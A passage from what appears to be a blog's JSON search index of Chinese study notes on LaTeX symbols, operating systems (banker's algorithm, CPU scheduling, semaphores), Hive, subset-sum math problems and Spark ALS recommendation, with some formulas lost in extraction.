test"},{"title":"","date":"2019-09-22T11:31:00.000Z","updated":"2022-05-10T02:26:00.000Z","comments":true,"path":"notes/LaTeX/index.html","permalink":"https://blog.mhuig.top/notes/LaTeX/","excerpt":"","text":".fa-secondary{opacity:.4} LaTeX 数学符号语法速查表 PS： 更多符号使用可以查看 [LaTeX:Symbols][Detexify][LaTexLive][DocAI] 加减乘除 符号 语法 + - \\times \\div 幂运算 符号 语法 a^x a^{xyz} \\sqrt{x} \\sqrt[n]{x} 逻辑运算 符号 语法 \\oplus \\vee \\wedge 关系运算 符号 语法 = \\not= \\approx &gt; &lt; 符号 语法 \\equiv \\le \\ge \\ll \\gg 集合 符号 语法 \\in \\ni \\subset \\supset \\subseteq \\supseteq 存在 符号 语法 \\exists \\forall 希腊字母要输入希腊字母只要用反斜杠 \\ 加上相应字母的拼写即可。大写字母将对应拼写的首字母大写即可，这里仅列出一部分作为参考。 符号（小写） 语法 \\phi \\omega \\delta \\gamma 符号（大写） 语法 \\Phi \\Omega \\Delta \\Gamma 箭头 符号 语法 \\gets \\to \\Leftarrow \\Rightarrow \\Leftrightarrow 省略号 符号 语法 \\dots \\cdots \\vdots \\ddots 头顶符号 符号 语法 \\hat{x} \\bar{x} \\vec{x} \\dot{x} \\ddot{x} 标准括号 符号 语法 ( ) [ ] 取整括号（函数） 符号 语法 \\lfloor \\rfloor \\lceil \\rceil 空格LaTex 默认会忽略掉空格，要显示空格的话需要自己用命令输入（mu 是一个数学单位）。 效果 说明 语法 空格宽度是当前字宽 (18mu) \\quad 空格宽度是 3mu \\, 空格宽度是 4mu \\: 空格宽度是 5mu \\; 空格宽度是 - 3mu (向左缩) \\! 空格宽度是标准空格键效果 在 \\ 后面敲一个空格 空格宽度是 36mu \\qquad 上标与下标使用 ^ 和 _ 来表示上下标，使用 {} 来限定上下标的所属关系，下面是一些使用示例。 符号 语法 x^i a_i x^{a_i} x^a_i x^{a^i} x_{i+1} 上划线下划线 符号 语法 \\overline{a+bi} \\underline{xyz} 分式分式有两种尺寸表示，分别用 frac 和 dfrac 关键字表示 尺寸 较小 较小 适中 适中 符号 语法 \\frac{1}{2} \\frac{1+\\frac{1}{x}}{3x + 2} \\dfrac{1}{2} \\dfrac{1+\\frac{1}{x}}{3x + 2} 连续嵌套使用时用：\\cfrac 符号显示 语法 \\cfrac{1+\\cfrac{2}{1+\\cfrac{2}{1+\\cfrac{2}{1}}}}{2} 根式 符号 语法 \\sqrt{x+y} \\sqrt{x} \\sqrt[n]{x} 三角函数直接反斜杠 \\ 加正常书写的符号即可，这里只列举几个。 符号 语法 \\cos \\sin \\arccos 符号 语法 \\cos^2 x +\\sin^2 x = 1 \\cos 90^\\circ = 0 求和 求积 求极限 符号 语法 \\sum \\prod \\lim 符号 语法 \\sum_{i=1}^{\\infty}\\frac{1}{i} \\prod_{n=1}^5\\frac{n}{n-1} \\lim_{x\\to\\infty}\\frac{1}{x} 求积分 偏导 符号 语法 \\int \\oint \\partial^2y 符号 语法 \\frac{d}{dx}\\left(x^2\\right) = 2x \\int 2x\\ dx = x^2+C \\frac{\\partial^2U}{\\partial x^2} + \\frac{\\partial^2U}{\\partial y^2} 绝对值直接插入竖线 | 即可，可使用 \\left 、 \\right 标签来指定竖线的垂直长度与那对应字符块匹配 直接插入竖线： |a^x|指定垂直长度相匹配： \\left|a\\right|^\\left|x\\right| 直接插入竖线：指定垂直长度相匹配： 注：所有成对出现的符号均可以像上面那样使用 \\left 、 \\right 标签来指定其大小匹配的字符块。 矩阵和行列式所有的矩阵都是使用 \\begin{matrix} 开始， \\end{matrix} 结束。其中的 matrix 还可以改为 pmatrix 、 bmatrix 、 Bmatrix 、 vmatrix 、 Vmatrix 。 在每一行中使用 &amp; 分隔元素，行末用双反斜杠 \\ 表示换行。 ## 基础格式 对于下面的公式，修改大括号内的关键字分别为 matrix 、 pmatrix 、 bmatrix 、 Bmatrix 、 vmatrix 、 Vmatrix 时对应的情况如下所示。 \\begin{matrix}A &amp; B &amp; C\\\\D &amp; E &amp; F\\\\G &amp; H &amp; I\\\\\\end{matrix} matrix pmatrix bmatrix Bmatrix vmatrix Vmatrix 带省略号的矩阵这里使用 bmatrix 做示范，其他的类似。 如上面 “省略号” 所在小节所示，时使用 \\cdots 表示水平方向省略号， \\vdots 表示竖直方向省略号， \\ddots 表示对角线方向省略号（我这里为了美观把公式按 &amp; 对齐了，这并不是必需的）。 \\begin{bmatrix}A &amp; B &amp; \\cdots &amp; C \\\\D &amp; E &amp; \\cdots &amp; F \\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\G &amp; H &amp; \\cdots &amp; I \\\\\\end{bmatrix} 矩阵方程（函数）使用 \\begin{equation} 作为整个公式块的开始，以 \\end{equation} 结束。在里面再配合其他符号的语法使用即可。 一个简单的例子如下（这里使用 bmatrix 做示范，其他的类似）。 \\begin{equation}H_x=\\frac{1}{3}\\times{\\begin{bmatrix}A &amp; B &amp; \\cdots &amp; C \\\\D &amp; E &amp; \\cdots &amp; F \\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots\\\\G &amp; H &amp; \\cdots &amp; I \\\\\\end{bmatrix}}\\end{equation} 其他符号 符号 语法 \\infty \\triangle \\angle \\checkmark \\nabla 公式引用 引用表达式 e^{i\\pi}+1=0 \\label{f1}引用表达式 \\eqref{f1}"},{"title":"","date":"2020-02-09T02:41:00.000Z","updated":"2022-09-06T01:26:00.000Z","comments":true,"path":"notes/NoSQL/Cassandra.html","permalink":"https://blog.mhuig.top/notes/NoSQL/Cassandra","excerpt":"","text":"Cassandra Cassandra - NoSQL volantis.css(\"/lib/hexo-github/github.css\"); volantis.js(\"/lib/hexo-github/github.js\").then(() => { new Badge(\"#badge-container-MHuiG-NoSQL-Archive-faa8fcab06dbfc3a3820ca251dd48feac8a4f1d7\", \"MHuiG\", \"NoSQL-Archive\", \"faa8fcab06dbfc3a3820ca251dd48feac8a4f1d7\", false); })"},{"title":"","date":"2020-02-09T02:42:00.000Z","updated":"2022-09-06T01:26:00.000Z","comments":true,"path":"notes/NoSQL/HBase.html","permalink":"https://blog.mhuig.top/notes/NoSQL/HBase","excerpt":"","text":"HBase HBase - NoSQL volantis.css(\"/lib/hexo-github/github.css\"); volantis.js(\"/lib/hexo-github/github.js\").then(() => { new Badge(\"#badge-container-MHuiG-NoSQL-Archive-faa8fcab06dbfc3a3820ca251dd48feac8a4f1d7\", \"MHuiG\", \"NoSQL-Archive\", \"faa8fcab06dbfc3a3820ca251dd48feac8a4f1d7\", false); })"},{"title":"","date":"2020-02-09T02:43:00.000Z","updated":"2022-09-06T01:26:00.000Z","comments":true,"path":"notes/NoSQL/MongoDB.html","permalink":"https://blog.mhuig.top/notes/NoSQL/MongoDB","excerpt":"","text":"MongoDB MongoDB - NoSQL volantis.css(\"/lib/hexo-github/github.css\"); volantis.js(\"/lib/hexo-github/github.js\").then(() => { new Badge(\"#badge-container-MHuiG-NoSQL-Archive-faa8fcab06dbfc3a3820ca251dd48feac8a4f1d7\", \"MHuiG\", \"NoSQL-Archive\", \"faa8fcab06dbfc3a3820ca251dd48feac8a4f1d7\", false); })"},{"title":"","date":"2020-02-09T02:40:00.000Z","updated":"2022-09-06T01:26:00.000Z","comments":true,"path":"notes/NoSQL/NoSQL.html","permalink":"https://blog.mhuig.top/notes/NoSQL/NoSQL","excerpt":"","text":"NoSQL NoSQL volantis.css(\"/lib/hexo-github/github.css\"); volantis.js(\"/lib/hexo-github/github.js\").then(() => { new Badge(\"#badge-container-MHuiG-NoSQL-Archive-faa8fcab06dbfc3a3820ca251dd48feac8a4f1d7\", \"MHuiG\", \"NoSQL-Archive\", \"faa8fcab06dbfc3a3820ca251dd48feac8a4f1d7\", false); })"},{"title":"","date":"2020-02-09T02:45:00.000Z","updated":"2022-09-06T01:26:00.000Z","comments":true,"path":"notes/NoSQL/Neo4j.html","permalink":"https://blog.mhuig.top/notes/NoSQL/Neo4j","excerpt":"","text":"Neo4j Neo4j - NoSQL volantis.css(\"/lib/hexo-github/github.css\"); volantis.js(\"/lib/hexo-github/github.js\").then(() => { new Badge(\"#badge-container-MHuiG-NoSQL-Archive-faa8fcab06dbfc3a3820ca251dd48feac8a4f1d7\", \"MHuiG\", \"NoSQL-Archive\", \"faa8fcab06dbfc3a3820ca251dd48feac8a4f1d7\", false); })"},{"title":"","date":"2022-05-10T02:04:00.000Z","updated":"2022-05-10T02:04:00.000Z","comments":true,"path":"notes/NoSQL/index.html","permalink":"https://blog.mhuig.top/notes/NoSQL/","excerpt":"","text":".fa-secondary{opacity:.4} NoSQL NoSQL .prev-next{ display: none !important; }"},{"title":"","date":"2019-09-26T08:24:00.000Z","updated":"2022-05-12T09:21:00.000Z","comments":true,"path":"notes/OS/bank.html","permalink":"https://blog.mhuig.top/notes/OS/bank","excerpt":"","text":"银行家算法 银行家算法 银行家算法（Banker's Algorithm）是一个避免死锁（Deadlock）的著名算法，是由艾兹格・迪杰斯特拉在 1965 年为 T.H.E 系统设计的一种避免死锁产生的算法。它以银行借贷系统的分配策略为基础，判断并保证系统的安全运行。 背景在银行中，客户申请贷款的数量是有限的，每个客户在第一次申请贷款时要声明完成该项目所需的最大资金量，在满足所有贷款要求时，客户应及时归还。银行家在客户申请的贷款数量不超过自己拥有的最大值时，都应尽量满足客户的需要。在这样的描述中，银行家就好比操作系统，资金就是资源，客户就相当于要申请资源的进程。 进程 Allocation Max Available ＡＢＣＤ ＡＢＣＤ ＡＢＣＤP1 ００１４ ０６５６ １５２０ P2 １４３２ １９４２ P3 １３５４ １３５６P4 １０００ １７５０ 我们会看到一个资源分配表，要判断是否为安全状态，首先先找出它的 Need，Need 即 Max (最多需要多少资源) 减去 Allocation (原本已经分配出去的资源)，计算结果如下： NEEDＡＢＣＤ０６４２ ０５１００００２０７５０ 然后加一个全都为 false 的字段 FINISHfalsefalsefalsefalse 接下来找出 need 比 available 小的 (千万不能把它当成 4 位数 他是 4 个不同的数) NEED AvailableＡＢＣＤ ＡＢＣＤ０６４２ １５２００５１０&lt;-０００２０７５０ P2 的需求小于能用的，所以配置给他再回收 NEED AvailableＡＢＣＤ ＡＢＣＤ０６４２ １５２０００００ ＋１４３２０００２－－－－－－－０７５０ ２９５２ 此时 P2 FINISH 的 false 要改成 true (己完成) FINISHfalsetruefalsefalse 接下来继续往下找，发现 P3 的需求为 0002，小于能用的 2952，所以资源配置给他再回收 NEED AvailableＡＢＣＤ Ａ Ｂ Ｃ Ｄ０６４２ ２ ９ ５ ２００００ ＋１ ３ ５ ４００００－－－－－－－－－－０７５０ ３ 12 10 6 依此类推，做完 P4→P1，当全部的 FINISH 都变成 true 时，就是安全状态。 安全和不安全的状态如果所有过程有可能完成执行（终止），则一个状态（如上述范例）被认为是安全的。由于系统无法知道什么时候一个过程将终止，或者之后它需要多少资源，系统假定所有进程将最终试图获取其声明的最大资源并在不久之后终止。在大多数情况下，这是一个合理的假设，因为系统不是特别关注每个进程运行了多久（至少不是从避免死锁的角度）。此外，如果一个进程终止前没有获取其它能获取的最多的资源，它只是让系统更容易处理。 基于这一假设，该算法通过尝试寻找允许每个进程获得的最大资源并结束（把资源返还给系统）的进程请求的一个理想集合，来决定一个状态是否是安全的。不存在这个集合的状态都是不安全的。"},{"title":"","date":"2019-09-24T13:11:00.000Z","updated":"2022-05-12T09:14:00.000Z","comments":true,"path":"notes/OS/cpu.html","permalink":"https://blog.mhuig.top/notes/OS/cpu","excerpt":"","text":"CPU 调度 CPU 调度 基本概念CPU－I / O 区间周期进程执行由 CPU 和 I／O 等待周期组成。进程在这两个状态之间切换。 CPU 调度程序所谓 CPU 调度程序，其实就是：当 CPU 空闲时，操作系统如何从就绪队列中选择一个进程来执行的策略。 抢占调度 非抢占调度，一旦 CPU 分配给一个进程，那么该进程会一直使用 CPU 直到进程终止或切换到等待状态。 抢占调度，可能一个进程正在运行时，另一个新的进程也到来。而依据调度策略与当前各进程状态，新进程应该先执行。那么，新进程会抢占 CPU 进行执行，原进程切换到就绪状态。 分派程序分派程序是一个模块，用来将 CPU 的控制交给由短期调度程序选择的进程。 功能包括： 切换上下文 切换到用户模式 跳转到用户程序的合适位置，以重新启动程序 调度准则 CPU 使用率 吞吐量：一个时间单元内所完成进程的数量 周转时间：从进程提交到进程完成的时间段称为周转时间。 等待时间：为在就绪队列中等待所花费时间之和 响应时间：开始响应所需要的时间，响应时间指从进程提交到被运行第一段代码的时间 调度算法1. 先到先服务调度（FCFS）非抢占。 补充概念：护航效果：所有其他进程等待一个大进程释放 CPU 的状态 2. 最短作业优先调度（SJF）这一算法将每个进程与其下一个 CPU 区间段相关联。当 CPU 为空闲时，它会赋给具有最短 CPU 区间的进程。 如果两个进程具有同样长度，那可以使用 FCFS 调度来处理。 SJF 调度算法的平均等待时间最小。 SJF 的难点就是如何得知下一个 CPU 区间的长度。书上采用，预测下一个 CPU 区间为以前 CPU 区间的测量长度的指数平均。 T（n＋1）＝åt（n）＋（1-å）T（n） 抢占 SJF 调度：最短剩余时间优先调度 也存在非抢占 SJF 3. 优先级调度SJF 可作为通用优先级调度算法的一个特例 （书上默认）优先级越高，数值越小 即 优先级 1 比优先级 2 的优先级要高 优先级调度可以是抢占的或者非抢占的。 主要问题：无穷阻塞或饥饿＝》它可能会导致某个低优先级进程无线等待 CPU 解决：使用老化技术，以逐渐增加在系统中等待很长时间的进程的优先级 4. 轮转法调度（RR）定义一个较小时间单元，称为时间片。 将就绪队列保存为进程的 FIFO 队列。新进程增加到就绪队列的尾部。CPU 调度程序就从就绪队列中选择第一个进程，设置定时器在一个时间片之后中断，再分排该进程。（1 进程在时间片中运行完，进程自动释放 CPU，下一个进程开始执行 2. 进程未在时间片内执行完，定时器产生中断并产生操作系统中断，然后进行上下文切换，将进程加入到就绪队列的尾部，就绪队列中下一个进程开始执行） 该策略的平均等待时间通常较长 具体效率和时间片大小有关 适合分时（交互系统） 5. 多级队列调度将就绪队列分成多个独立队列，每个队列有自己的调度算法，每个队列有自己的优先级 6. 多级反馈队列调度在上面的基础上，允许等待时间过长的进程转移到更高优先级的队列"},{"title":"","date":"2019-05-10T06:21:00.000Z","updated":"2022-05-12T01:33:00.000Z","comments":true,"path":"notes/Hive/overview.html","permalink":"https://blog.mhuig.top/notes/Hive/overview","excerpt":"","text":"Overview Hive 基本概念 什么是 HiveHive 是基于 Hadoop 的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供类 SQL 查询功能。其本质是将 SQL 转换为 MapReduce 的任务进行运算，底层由 HDFS 来提供数据的存储，说白了 hive 可以理解为一个将 SQL 转换为 MapReduce 的任务的工具，甚至更进一步可以说 hive 就是一个 MapReduce 的客户端 为什么使用 Hive直接使用 hadoop 所面临的问题 人员学习成本太高 项目周期要求太短 MapReduce 实现复杂查询逻辑开发难度太大 为什么要使用 Hive 操作接口采用类 SQL 语法，提供快速开发的能力。 避免了去写 MapReduce，减少开发人员的学习成本。 功能扩展很方便。 Hive 的特点可扩展Hive 可以自由的扩展集群的规模，一般情况下不需要重启服务。 延展性Hive 支持用户自定义函数，用户可以根据自己的需求来实现自己的函数。 容错良好的容错性，节点出现问题 SQL 仍可完成执行。 Hive 与 Hadoop 的关系Hive 利用 HDFS 存储数据，利用 MapReduce 查询分析数据 Hive 与传统数据库对比hive 用于海量数据的离线数据分析 总结：hive 具有 sql 数据库的外表，但应用场景完全不同，hive 只适合用来做批量数据统计分析"},{"title":"","date":"2019-09-12T01:45:00.000Z","updated":"2022-05-12T09:17:00.000Z","comments":true,"path":"notes/OS/fdd.html","permalink":"https://blog.mhuig.top/notes/OS/fdd","excerpt":"","text":"前驱图和程序执行 前驱图和程序执行 在多道程序环境中，允许多个程序并发执行；程序本身是具体代码，不能反映程序的执行过程从而引入进程。进程是抽象的。作为资源分配和独立运行的基本单位是进程。操作系统所有的特征都是基于进程而体现的。 程序顺序执行时的特征 顺序性：每个操作在上一操作结束后开始 封闭性：程序开始执行，其执行结果不受外界因素影响 可再现性：只要环境和初始条件相同，其执行结果一定相同 前驱图前驱图是一个有向无循环图（DAG)，用于描述进程之间执行的前后关系。 注意：前驱图中不能存在循环。 程序并发执行及其特征 间断性： 共享资源 -&gt; 相互制约 -&gt; 执行 - 暂停 - 执行 失去封闭性： 一个程序的执行受到其他程序的影响 不可再现性 结论并发是提高资源利用率的好方法，从而提高系统吞吐量，所以程序尽量并发执行。 1）串行是顺序执行； 2）并发是交叉使用设备； 3）并行使用多个处理机 --- 更快。"},{"title":"","date":"2022-05-10T06:58:00.000Z","updated":"2022-05-10T06:58:00.000Z","comments":true,"path":"notes/OS/index.html","permalink":"https://blog.mhuig.top/notes/OS/","excerpt":"","text":".fa-secondary{opacity:.4} OS OS .prev-next{ display: none !important; }"},{"title":"","date":"2019-09-11T11:03:00.000Z","updated":"2022-05-12T09:14:00.000Z","comments":true,"path":"notes/OS/introduction.html","permalink":"https://blog.mhuig.top/notes/OS/introduction","excerpt":"","text":"操作系统引论 操作系统引论 操作系统（OS）是配置在计算机硬件上的第一层软件，是对硬件系统的首次扩充。 操作系统的定义OS 是一组控制和管理计算机硬件和软件资源，合理地对各类作业进行调度（合理地组织计算机工作），以及方便用户使用的程序的集合 操作系统的目标和作用操作系统的目标 方便性 * 有效性 * 提高系统资源利用率 提高系统吞吐量 可扩充性 开放性 遵循世界标准规范 方便性和有效性是设计操作系统时最重要的两个目标。 操作系统的作用 OS 作为用户与计算机硬件系统之间的接口（用户的角度） 三种方式使用计算机： 命令行方式 系统调用方式 图标窗口方式 OS 作为计算机系统资源的管理者（资源管理角度） 对四类资源进行管理： 处理机管理 存储器管理 I / O 设备管理 文件管理 资源管理包含两种资源共享的使用方法： 分时 多个用户分时地使用该资源 空分 存储资源的空间可以被多个用户共同以分割的方式占用。 OS 实现了对计算机资源的抽象（扩充机器） 裸机 虚拟机 / 扩展机 推动操作系统发展的主要动力 不断提高计算机资源利用率 方便用户 机器的不断更新换代 计算机体系结构的不断发展 不断提出新的应用需求 操作系统的发展过程无操作系统的计算机系统 人工操作方式 缺点： 用户独占全机 CPU 等待人工操作 人机矛盾 CPU 与 I / O 设备之间速度不匹配的矛盾 工作效率低 脱机输入/输出（Off-Line I/O）方式 程序和数据的输入和输出都是在外围机的控制之下完成的， 即：程序和数据的输入和输出是在脱离主机的情况下进行 脱机 I / O 的主要优点 减少了 CPU 的空闲时间 提高 I/O 速度，缓和了 CPU 和 I/O 设备间不匹配的矛盾 单道批处理操作系统 单道批处理系统的处理过程 批处理系统旨在提高系统资源的利用率和系统吞吐量. 特征: 自动性 顺序性 单道性 单道批处理系统的缺点最主要缺点：系统中的资源得不到充分利用 多道批处理操作系统 多道程序设计的基本概念： 内存同时驻留多道程序 (作业)，处理机 (单处理机) 以交替的方式同时处理多道程序。 宏观：已有多道程序开始运行且尚未结束； 微观：某一时刻处理机只运行某道作业。 好处： 提高 CPU 的利用率； 可提高内存和 I / O 设备的利用率； 增加系统吞吐量。 能提高吞吐量的原因： 使 CPU 和资源保持 “忙碌” 状态； 仅当作业完成或运行不下去时才进行切换，系统开销小。 特征 多道性 无序性：作业完成的先后顺序和他们进入内存的顺序并无严格的对应关系 调度性: A、作业调度 B、进程调度 优点： 资源利用率高 系统吞吐量大 缺点： 平均周转时间长 作业的周转时间是指从作业进入系统开始，直至其完成并退出系统为止所经历的时间。 无交互能力 推动多道批处理系统形成和发展的主要动力是提高资源利用率和系统吞吐量； 分时操作系统 推动分时系统形成和发展的主要动力，则是用户的需求（人 —— 机交互）。 工作方式 一台主机连接了若干个终端；每个终端有一个用户在使用； 交互式的向系统提出命令请求； 系统接受每个用户的命令采用时间片轮转方式处理服务请求并通过交互方式在终端上向用户显示结果，用户根据上步结果发出下道命令。 关键问题: 及时接收 及时处理 作业直接进入内存，在内存才能处理； 采用轮转运行方式。 不允许一个作业长期占用处理机； 规定每个作业只能运行很短的时间，使每个用户及时与自己的作业交互，从而用户请求得到及时响应。 特点 多路性：即同时性（宏观的同时） 交互性 独立性：用户好像独占主机 及时性 实时操作系统 定义 是指系统能及时响应外部事件的请求，在规定的时间内完成对该事件的处理，并控制所有实时任务协调一致地运行。 实时系统与分时系统特征的比较 多路性 独立性 及时性 交互性 可靠性 操作系统的基本特性 并发性 间断性 失去封闭性 不可再现性 共享性 互斥共享（临界资源） 同时访问（eg：同时读磁盘） 虚拟技术 时分复用技术 虚拟处理机技术 虚拟设备技术 空分复用技术 虚拟磁盘技术 虚拟存储器技术（内存） 异步性 OS 结构设计 无结构 OS 模块化 OS 分层式 OS 微内核 OS 微内核技术：是指精心设计的、能实现现代操作系统核心功能的小型内核，运行在核心态，开机后常驻内存。 常驻内存的好处：因为 CPU 只访问内存，速度快、效率高。 微内核 OS 优点： 提高系统的可扩展性 增强系统的可靠性 可移植性强 提供对分布式系统的支持 融入面向对象技术"},{"title":"","date":"2019-09-12T01:54:00.000Z","updated":"2022-05-12T09:14:00.000Z","comments":true,"path":"notes/OS/process.html","permalink":"https://blog.mhuig.top/notes/OS/process","excerpt":"","text":"进程的描述 进程的描述 为了能使程序并发执行，并且可以对并发执行的程序加以描述和控制，人们引入了 “进程” 的概念。 进程的特征和定义结构特征进程实体是由程序段、数据段及进程、控制块（PCB）三部分组成. UNIX 中将这三部分称为 “进程映像”。 创建进程：创建进程实体中的进程控制块（PCB）。 撤销进程：撤销进程实体中的进程控制块（PCB）。 进程的特征 动态性 并发性 独立性 异步性"},{"title":"","date":"2019-09-24T13:13:00.000Z","updated":"2022-09-06T02:22:00.000Z","comments":true,"path":"notes/OS/semaphore.html","permalink":"https://blog.mhuig.top/notes/OS/semaphore","excerpt":"","text":"信号量机制 进程同步之信号量机制 信号量（semaphore）的数据结构为一个值和一个指针，指针指向等待该信号量的下一个进程。信号量的值与相应资源的使用情况有关。 信号量机制信号量机制即利用 pv 操作来对信号量进行处理。 什么是信号量？信号量（semaphore）的数据结构为一个值和一个指针，指针指向等待该信号量的下一个进程。信号量的值与相应资源的使用情况有关。 当它的值大于 0 时，表示当前可用资源的数量； 当它的值小于 0 时，其绝对值表示等待使用该资源的进程个数。 注意，信号量的值仅能由 PV 操作来改变。 一般来说，信号量 S$\\ge$0 时，S 表示可用资源的数量。执行一次 P 操作意味着请求分配一个单位资源，因此 S 的值减 1；当 S &lt; 0 时，表示已经没有可用资源，请求者必须等待别的进程释放该类资源，它才能运行下去。而执行一个 V 操作意味着释放一个单位资源，因此 S 的值加 1；若 S£0，表示有某些进程正在等待该资源，因此要唤醒一个等待状态的进程，使之运行下去。 经典伪代码p 操作（wait）：申请一个单位资源，进程进入 wait(semaphore *S){ S-&gt;value--; if(S-&gt;value&lt;0) block(S-&gt;list);} v 操作（signal）：释放一个单位资源，进程出来 signal(semaphore *S){ S-&gt;value++; if(S-&gt;value&lt;=0) wakeup(S-&gt;list);} 综合训练专题"},{"title":"","date":"2025-09-14T11:14:00.000Z","updated":"2025-09-14T11:47:00.000Z","comments":true,"path":"notes/P-2000/1.html","permalink":"https://blog.mhuig.top/notes/P-2000/1","excerpt":"","text":"D2-2000 Problem D2-2000 Problem QuestionFind the number of subsets of ,the sum of whose elements is divisible by . 对于集合 ，它有多少个子集满足这个子集中所有数之和能被 整除? Construction generating functionFactored Expanded Carry in special value （ , or ）"},{"title":"","date":"2025-09-14T11:14:00.000Z","updated":"2025-09-14T11:47:00.000Z","comments":true,"path":"notes/P-2000/2.html","permalink":"https://blog.mhuig.top/notes/P-2000/2","excerpt":"","text":"D5-2000 Problem D5-2000 Problem QuestionFind the number of subsets of , the sum of whose elements is divisible by . 对于集合 ，它有多少个子集满足这个子集中所有数之和能被 整除? 递推法首先对集合进行分组 。对于任意 ，其子集中所有数字的和对 取余的结果与 相同。可以得到结果为 的个数分别为 。注意空集也满足条件（认为空集的所有数字和为 ）。 记 为 ，记 满足条件的子集个数为 ，则 满足条件的子集为： 对于数字和能被 整除的 子集，同样取数字和能被 整除的 子集配对，个数为 对于数字和对 取余为 的 子集，取数字和对 取余为 的 子集配对。对于其它余数情况同理，可以得到这样的子集个数为 综上有 求通项公式 并代入 即可得到原问题答案： 生成函数法生成函数经常用于组合计数中。考虑多项式： 将其展开的过程可以与构造子集的过程一一对应：每个元素都只有选与不选两种选择，展开过程选择 则意味着集合选取了元素 。同时由于乘法的特性 ，展开式中各项的次数即等于对应子集的元素和，因此系数就对应着有多少这样的子集。 由于元素和是否能被 整除只和模 的余数有关，生成函数可以简化为 所以原问题等价与求该展开式中所有 项的系数和。可以利用 次单位根性质。 单位根 在复平面上的单位根为： 令 ，则 的根可以写作 。又由如下的关系式： 可以得到： 上式代入任意 可以得到： 求解根据 ，可以令 为 的单位根，则 中所有 项的系数和可以由下式计算： 其中 。 可以通过 中代入 进行计算，得到 ，同理可得其它项。最后答案为： 视频演示3Blue1Brown Video (Bilibili) Harnessing the Complex , . let then, , Final blow let then,"},{"title":"","date":"2025-09-14T11:19:00.000Z","updated":"2025-09-14T11:42:00.000Z","comments":true,"path":"notes/P-2000/3.html","permalink":"https://blog.mhuig.top/notes/P-2000/3","excerpt":"","text":"P-2000 Problem P-2000 Problem QuestionFind the number of subsets of , the sum of whose elements is prime. 对于集合 ，它有多少个子集满足这个子集中所有数之和是素数? 这个问题的答案是一个 601 位数字： 8304892715152426936070137498180366951323123591338457648721906297038206398756692872049939952182387776762800183885248459501290786564672210354017773551424848046927045008616079056825560648898468420422621846146793963340643941518503008500235293658542807207327191593631098329387532209089313120780635029943442431234175045726292274653309041480530386826868074866076060116609031902385565926623884348992521276793726611890186670817874208487624041237443330782153639899786616257926061126750693091906490532639948176692797958350410415027075011620429258616974629063357332305654228520374355076798057182569127825638179177"},{"title":"","date":"2025-09-14T22:23:00.000Z","updated":"2025-09-14T22:42:00.000Z","comments":true,"path":"notes/P-2000/4.html","permalink":"https://blog.mhuig.top/notes/P-2000/4","excerpt":"","text":"P-∞ Problem P-∞ Problem QuestionFind the number of subsets of , the sum of whose elements is prime. 对于无限集合 ，它有多少个子集满足这个子集中所有数之和是素数? Answer这个问题的答案是无穷大，这是显然的。"},{"title":"","date":"2025-09-14T11:08:00.000Z","updated":"2025-09-14T11:47:00.000Z","comments":true,"path":"notes/P-2000/index.html","permalink":"https://blog.mhuig.top/notes/P-2000/","excerpt":"","text":"P-2000 Archive P-2000 Archive .prev-next{ display: none !important; }"},{"title":"","date":"2020-08-02T07:34:00.000Z","updated":"2022-05-10T02:09:00.000Z","comments":true,"path":"notes/Spark/als.html","permalink":"https://blog.mhuig.top/notes/Spark/als","excerpt":"","text":"ALS 基于 Audioscrobbler 数据集的音乐推荐 (pyspark) 根据用户播放次数数据使用协同过滤算法完成音乐推荐。 数据集Audioscrobbler 数据集 下载 Audioscrobbler 数据集 user_artist_data.txt它包含 141000 个用户和 160 万个艺术家，记录了约 2420 万条用户播放艺术家歌曲的信息，其中包括播放次数信息。播放次数较多意味着该用户更喜欢对应艺术家的作品。 userid artistid playcount 用户 ID 艺术家 ID 播放次数 1000002 1 55 artist_data.txt该文件包含两列： artistid artist_name 艺术家 ID 艺术家名字。文件中给出了每个艺术家的 ID 和对应的名字。此文件用于 ID 与名字的转换。 artistid artist_name 艺术家 ID 艺术家名 1134999 06Crazy Life artist_alias.txt该文件包含两列: badid, goodid 坏 ID 好 ID 。该文件包含已知错误拼写的艺术家 ID 及其对应艺术家的正规的，用于将拼写错误的艺术家 ID 或 ID 变体对应到该艺术家正确的 ID。 badid goodid 坏 ID 好 ID 1092764 1000311 算法交替最小二乘推荐算法 (Alternating Least Squares，ALS)人们虽然经常听音乐，但很少给音乐评分。因此 Audioscrobbler 数据集覆盖了更多的用户和艺术家，也包含了更多的总体信息，虽然单条记录的信息比较少。这种类型的数据通常被称为隐式反馈数据，因为用户和艺术家的关系是通过其他行动隐含体现出来的，而不是通过显式的评分或点赞得到的。 根据两个用户的相似行为判断他们有相同的偏好，学习算法不需要用户和艺术家的属性信息。这类算法通常称为协同过滤算法。 潜在因素模型：试图通过数据相对少的未被观察到的底层原因，来解释大量用户和产品之间可观察到的交互。因子分析方法背后的理论是，有关观测变量之间的相互依赖性的信息可以稍后用于减少数据集中的变量集。 矩阵分解模型：数学上，算法把用户和产品数据当成一个大矩阵 R，矩阵第 i 行和第 j 列上的元素有值，代表用户 i 播放过艺术家 j 的音乐。矩阵 R 是稀疏的：R 中大多数元素都是 0，因为相对于所有可能的用户 - 艺术家组合，只有很少一部分组合会出现在数据中。算法将 R 分解为两个小矩阵 U 和 P 的乘积。矩阵 U 和矩阵 P 非常 “瘦”。因为 A 有很多行和列，但 U 和 P 的行很多而列很少（列数用 k 表示）。这 k 个列就是潜在因素，用于解释数据中的交互关系。由于 k 的值小，矩阵分解算法只能是某种近似。 为了使低秩矩阵 P 和 U 尽可能的逼近 R，可以通过最小化如下损失函数 L 来完成。 损失函数公式与上图对应：表示用户 i 的偏好隐含向量，表示艺术家 j 包含的隐含特征向量，表示用户 i 对艺术家 j 的评分，是用户 i 对艺术家 j 评分的近似。其中 λ 是正则化项的系数，损失函数一般需要加入正则化项来避免过拟合等问题。 于是就简化为一个最小化损失函数 L 的优化问题。用户 - 特征矩阵和特征 - 艺术家矩阵的乘积的结果是对整个稠密的用户 - 艺术家相互关系矩阵的完整估计。该乘积可以理解成艺术家与其属性之间的一个映射，然后按用户属性进行加权。 通常没有确切的解，因为 U 和 P 通常不够大，不足以完全表示 R， 应该尽可能逼近 R。然而不幸的是，想直接同时得到 U 和 P 的最优解是不可能的。 如果 P 已知，求 U 的最优解是非常容易的，反之亦然。但 P 和 U 事先都是未知的。 虽然 P 是未知的，但可以把 P 初始化为随机行向量矩阵。接着运用简单的线性代数，就能在给定 R 和 P 的条件下求出 U 的最优解。实际上，U 的第 i 行是 R 的第 